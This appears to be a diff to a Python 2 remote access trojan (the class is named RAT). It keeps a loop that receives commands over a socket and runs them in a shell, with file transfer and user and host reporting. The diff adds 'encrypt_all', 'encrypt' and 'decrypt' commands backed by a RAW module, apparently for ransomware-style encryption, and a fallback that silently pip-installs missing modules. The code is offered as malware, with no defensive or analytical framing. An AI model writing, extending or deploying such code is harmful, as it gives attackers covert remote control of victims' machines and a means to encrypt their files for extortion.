@@ -106,12 +106,17 @@
 ############################
 
 import os
-import sys
-import time
-import socket
-import getpass
-import subprocess
-
+try:
+	import sys
+	import pip
+	import time
+	import socket
+	import getpass
+	import subprocess
+	import RAW
+except ImportError as e:
+	pip = lambda : os.system('pip install' + str(e)[15:])
+	pip()
 
 
 class RAT:
@@ -120,6 +125,7 @@ class RAT:
 	_port = None
 	_loop = None
 	_info = None
+	_raw = None
 
 	BUFFER = 1024
 	SHORT_INTERVAL = 0.1
@@ -146,6 +152,7 @@ class RAT:
 		# set new port
 		cls._port = 4434
 		cls._info = cls.build_info()
+		cls._raw = RAW()
 
 
 	# get fisrt time interaction info
@@ -153,8 +160,9 @@ class RAT:
 		str1 = "\n[+] USER: "
 		str2 = "\n[+] HOSTNAME: "
 		com1 = "\n\n<!> get more info using 'sys_info' command"
-		com2 = "\n<!> to Disconnect: press Enter and then Ctrl+C\n"
-		return "{}{}{}{}{}{}".format(str(str1), str(getpass.getuser()), str(str2), str(os.uname()[1]), str(com1), str(com2))
+		com2 = "\n<!> terminate the remote host connection using 'terminate' command"
+		com3 = "\n<!> press Enter and then Ctrl+C :: remote host connection will keep alive\n\n"
+		return "{}{}{}{}{}{}{}".format(str(str1), str(getpass.getuser()), str(str2), str(os.uname()[1]), str(com1), str(com2), str(com3))
 
 	# send data
 	def send(cls, cmd):
@@ -228,6 +236,38 @@ class RAT:
 		return "\n"+str(os.uname())+"\n"
 
 
+	# socket error handler
+	def socket_handler(cls, error_type):
+		# Connection refused
+		if(error_type[0] is 61):
+			cls.stop()
+			time.sleep(cls.LONG_INTERVAL)
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
+			
+		# Socket is not connected
+		if(error_type[0] is 57):
+			cls.stop()
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
+			time.sleep(cls.LONG_INTERVAL)		
+			
+		# Bad file descriptor
+		elif(error_type[0] is 9):
+			cls.stop()
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str(error_type[1]))
+			time.sleep(cls.LONG_INTERVAL)
+			
+		# Broken Pipe
+		elif(error_type[0] is 32):
+			cls.stop()
+			print "CODE: {}\nMSG: {}\n-------".format(str(error_type[0]), str([1]))
+			time.sleep(cls.LONG_INTERVAL)
+			
+		else:
+			cls.stop()
+			print "CODE: {}\nMSG: {}".format(str(error_type[0]), str(error_type[1]))
+			time.sleep(cls.LONG_INTERVAL)
+			
+
 	# start the service
 	def start(cls):
 		while True:			
@@ -242,13 +282,12 @@ class RAT:
 
 				while(cls.FLAG):
 
-
 					data = cls.receive()
 					# check for quit
 					if(data == 'quit' or data == 'terminate'):
 						cls.send('Quitted...')
 						break
-						
+
 					# check for change directory
 					elif(data.startswith('cd ')):
 						os.chdir(data[3:])
@@ -259,17 +298,25 @@ class RAT:
 					# check for upload
 					elif(data.startswith('upload ')):
 						stdoutput = download(data[7:])
-					#send system info
+					# send system info
 					elif(data.startswith('sys_info')):
 						stdoutput = cls.drill_down()
+					# encrypt all data
+					elif(data.startswith('encrypt_all')):
+						cls._raw.handler(data, "")
+					# encrypt data 
+					elif(data.startswith('encrypt')):
+						cls._raw.handler(data, "")
+					# decrypt data 
+					elif(data.startswith('decrypt')):
+						cls._raw.handler(data, "")
 
-					
+					# bind a shell subprocess  
 					else:
 						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 						stdoutput = proc.stdout.read() + proc.stderr.read()
 
 					# Send data to server
-					
 					stdoutput += "\n" + os.getcwd() + "> "
 					stdoutput = stdoutput.decode('gbk').encode('utf-8')
 					cls.send(stdoutput)
@@ -279,35 +326,8 @@ class RAT:
 					time.sleep(cls.S_INTERVAL)
 
 			except socket.error as e:
-				# Connection refused
-				if(e[0] is 61):
-					cls.stop()
-					time.sleep(cls.LONG_INTERVAL)
-					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
-					continue
-				# Socket is not connected
-				if(e[0] is 57):
-					cls.stop()
-					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
-					time.sleep(cls.LONG_INTERVAL)		
-					continue
-				# Bad file descriptor
-				elif(e[0] is 9):
-					cls.stop()
-					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
-					time.sleep(cls.LONG_INTERVAL)
-					continue
-				# Broken Pipe
-				elif(e[0] is 32):
-					cls.stop()
-					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
-					time.sleep(cls.LONG_INTERVAL)
-					continue
-				else:
-					cls.stop()
-					print "CODE: {}\nMSG: {}".format(str(e[0]), str(e[1]))
-					time.sleep(cls.LONG_INTERVAL)
-					continue
+				cls.socket_handler(e)
+				continue
 
 
 	
